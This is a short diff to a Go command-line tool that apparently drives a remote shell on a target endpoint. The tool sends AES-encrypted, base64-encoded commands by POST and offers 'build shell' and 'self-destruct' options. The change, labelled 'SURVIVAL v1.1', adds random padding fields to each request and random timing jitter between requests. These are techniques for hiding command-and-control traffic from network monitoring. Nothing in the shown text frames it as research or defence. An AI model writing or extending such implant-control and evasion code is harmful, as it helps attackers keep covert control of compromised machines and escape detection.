@@ -9,6 +9,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
@@ -59,6 +60,7 @@ func loadConfig() (ConfigSession, error) {
 }
 
 func main() {
+	rand.Seed(time.Now().UnixNano())
 	for {
 		showBanner()
 		fmt.Printf("\n> 1 < BUILD SHELL\n")
@@ -143,7 +145,7 @@ func menuShell() {
 	fmt.Print("\033[H\033[2J")
 	fmt.Printf("%s[ K-SHELL SPAWNED ]%s\n", green, reset)
 	fmt.Printf("Endpoint: %s\n", target)
-	fmt.Println("Commands: 'exit' to menu, 'self-destruct' to kill agency.\n")
+	fmt.Println("Commands: 'exit' to menu, 'self-destruct' to kill agency.")
 
 	reader := bufio.NewReader(os.Stdin)
 	for {
@@ -165,6 +167,14 @@ func menuShell() {
 		encryptedCmd := crypto.EncryptAES([]byte(effectiveCmd), key[:])
 		payload := url.Values{}
 		payload.Set("d", base64.StdEncoding.EncodeToString(encryptedCmd))
+
+		// SURVIVAL v1.1: Data Padding & Jitter
+		pKey := fmt.Sprintf("_%x", rand.Int63())
+		pVal := fmt.Sprintf("%x", rand.Int63())
+		payload.Set(pKey, pVal)
+
+		jitter := time.Duration(300+rand.Intn(1200)) * time.Millisecond
+		time.Sleep(jitter)
 
 		req, _ := http.NewRequest("POST", target, strings.NewReader(payload.Encode()))
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
